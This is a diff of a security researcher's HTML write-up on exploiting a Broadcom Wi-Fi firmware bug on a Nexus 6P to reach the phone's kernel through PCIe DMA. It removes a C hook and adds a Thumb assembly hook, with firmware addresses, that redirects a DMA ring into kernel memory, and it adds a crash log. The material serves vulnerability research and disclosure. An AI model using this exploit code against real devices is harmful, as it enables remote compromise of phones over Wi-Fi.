@@ -60,7 +60,7 @@ footer {
 <li>An implementation of <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_11.html">Project Zero's DMA engine hook</a> to corrupt the kernel in the main system memory over PCIE</li>
 </ul>
 
-<p>The first part is very reliable - I can always get code execution; the second part only worked once and stopped working afterwards. I don't know why.</p>
+<p>The first part is very reliable - I can always get code execution; the second part only works sometimes, since we're pointing the Wi-Fi packet DMA into main memory, and so success depends on what packets are DMAed.</p>
 
 <h2>Code execution on the Wi-Fi chip</h2>
 
@@ -176,33 +176,35 @@ typedef struct wlc_hrt_to {
 
 <p>Let's implement <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_11.html">Project Zero's DMA attack</a>. The TLDR of their approach is that recent phones connect Wi-Fi chipsets via PCI Express, which allows arbitrary memory writes and reads through DMA. By manipulating the list of DMA buffers on the Wi-Fi chip, an attacker can write any information into main memory, thus getting code execution on the main CPU.</p>
 
-<p>To implement their attack, we use our write primitive to patch the beginning of dma64_txfast to jump into the code in our payload.</p>
-
-<p>Per Project Zero's approach, the exploit code checks if the DMA engine is the "D2H" engine (which does Device-To-Host writes), and, if so, iterate through all DMA descriptors to point them into the Android kernel's code. Since we don't control the data being DMAed, this will only cause a crash on the main CPU, but this is good enough for a proof of concept.</p>
-
-<p>I wrote the <a href="code/shellcode.c">payload in C</a> first:</p>
+<p>I'm using Project Zero's first DMA attack, which simply sets the D2H_MSGRING_TX_COMPLETE ring's ringaddr to point into the kernel. I dumped the address of the ring structure using Project Zero's <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1046">dump_pci.py</a> script, and then wrote a hook that patches the target address to 0x248488 in the main CPU's physical memory (which seems to correspond to critical code in the kernel I'm running), and also patches out the WME IE bug that we exploited in the first place (so that we don't accidentally run the exploit twice). Here's the hook:</p>
 
 <pre>
-void dma64_txfast_hook(dma_info_t *di, void *p0, bool commit) {
-	*((unsigned short*)wlc_bss_parse_wme_ie_addr) = 0x4770; // patch out the bug to prevent further damage
-	uint* p = (uint*)(&di->name);
-	if (*p != 0x00483244) return; // D2H
-	dma64dd_t *txd_64 = di->dregs.d64_u.txd_64;
-	for (;;) {
-		if (txd_64->addrlow == 0xdeadbeef) break;
-		txd_64->addrlow = overwrite_addr_low;
-		txd_64->addrhigh = overwrite_addr_high;
-		txd_64++;
-	}
-}
+.syntax unified
+.thumb
+hook_entry: // 0x90
+	push {r0-r3,r4-r9,lr}		// 0x217090
+	bl fullhook			// 0x217094
+	pop {r0-r3}			// 0x217098
+	.word 0xbaf9f774		// 0x21709a: branch to original txfast
+fullhook:
+	ldr	r3, patchoutaddr	// 0x21709e
+	ldr	r2, patchaddr		// 0x2170a0
+	str	r2, [r3]		// 0x2180a2
+	ldr	r2, ringaddr		// 0x2180a4
+	ldr	r3, valuewritten	// 0x2180a6
+	str	r3, [r2]		// 0x2180a8
+	bx	lr			// 0x2180aa
+valuewritten:
+	.word 0x00248488		// 0x2180ac physical address on the host side; seems to crash things...
+patchoutaddr:
+	.word 0x1b8ad0			// 0x2180b0 function to patch
+patchaddr:
+	.word 0x47702000		// 0x2180b4 mov r0, #0; bx lr note firmware overwrites byte 0 with a 0; it's fine
+ringaddr:
+	.word 0x002397C4		// 0x2180b8 ringaddr of D2H_MSGRING_TX_COMPLETE dumped with Project Zero's dump_pci.py
 </pre>
 
-<p>Then compiled it to assembly code:</p>
-<pre>arm-linux-androideabi-gcc -S -Os -mthumb -mcpu=cortex-a9 shellcode.c</pre>
-
-<p>And <a href="code/shellcode_edited2.s">modified the assembly</a> to fit within the payload by splitting it into multiple parts.</p>
-
-<p>I tried to avoid overwriting the heap metadata to avoid instability on the Wi-Fi chip, but in the end I ran out of space in the payload, went "screw it" and overwrote the heap metadata for the last chunk. It doesn't seem to be a problem.</p>
+<p>This is then assembled and placed into the payload. The next time dma64_txfast is called, our code will patch the DMA ring, and the next Wi-Fi packet to be processed will overwrite part of the main CPU's kernel, crashing it.</p>
 
 <p>The final payload can be seen <a href="code/sploit.txt">here</a>, along with <a href="code/encode_t2_branch.py">other</a> <a href="code/removecomments.py">useful</a> <a href="code/startit.sh">scripts</a>.</p>
 
@@ -210,7 +212,9 @@ void dma64_txfast_hook(dma_info_t *di, void *p0, bool commit) {
 
 <p>Experimental setup: computer same as before (Ubuntu 14.04, hostapd 2.6, Intel 7260 integrated Wi-Fi). Phone same as before: Google/Huawei Nexus 6P: running the latest firmware (N2G48B), but modified with the vulnerable June Broadcom firmware for testing this bug, and with a custom kernel for rooting. Since the bug is in the Wi-Fi firmware only, this should give the same result as an unupdated stock Nexus 6P.</p>
 
-<p>When the device connected to the network, it froze, and then after a few seconds it rebooted. The console-ramoops file (which contains the kernel log from the previous boot) shows a kernel panic from an invalid instruction exception in the kernel. (I tried to overwrite sys_nanosleep, but missed. It seemed to break something at least.)</p>
+<p>When the device connects to the network, it froze, and then after a few seconds it rebooted. The console-ramoops file (which contains the kernel log from the previous boot) shows a kernel panic from an invalid instruction exception in the kernel. (I tried to overwrite sys_nanosleep, but missed. It seemed to break something at least.)</p>
+
+<p>The crash isn't very reliable (the code exec on the wi-fi chip seems to be reliable, but getting the PCIE DMA to cooperate isn't.) When it works, the crash log shows this:</p>
 
 <pre>
 [ 5887.413947] CFG80211-ERROR) wl_cfg80211_connect : Connecting to (MAC address) with channel (1) ssid (Network)
@@ -275,7 +279,7 @@ r:kernel:s0 tclass=system permissive=1
 <p>There's a few issues that prevents this proof-of-concept from being useful.</p>
 
 <ul>
-<li>Project Zero's proof of concept, implemented here, DMAs random network packets into main memory; can we control what's written so that we can modify the kernel instead of just corrupting and crashing it?</li>
+<li>Project Zero's proof of concept, implemented here, DMAs random network packets into main memory; I was unable to implement their more advanced dma64_txfast hook (which gives more control over the address to write. It worked once, and only once, and I can't reproduce it.) can we control what's written so that we can modify the kernel instead of just corrupting and crashing it?</li>
 
 <li>Currently, the Wi-Fi stops working if I trigger the bug, even if I use a payload that doesn't crash the device or the Wi-Fi chip. It just fails to finish connecting to network. An attacker will need to keep the Wi-Fi working to avoid user suspicion and to exfiltrate data.</li>
 
@@ -301,7 +305,7 @@ $ adb shell
 
 <hr/>
 
-<footer>Zhuowei Zhang (<a href="https://twitter.com/zhuowei">@zhuowei</a>), 2017-07-12</footer>
+<footer>Zhuowei Zhang (<a href="https://twitter.com/zhuowei">@zhuowei</a>), 2017-07-13</footer>
 
 </body>
 
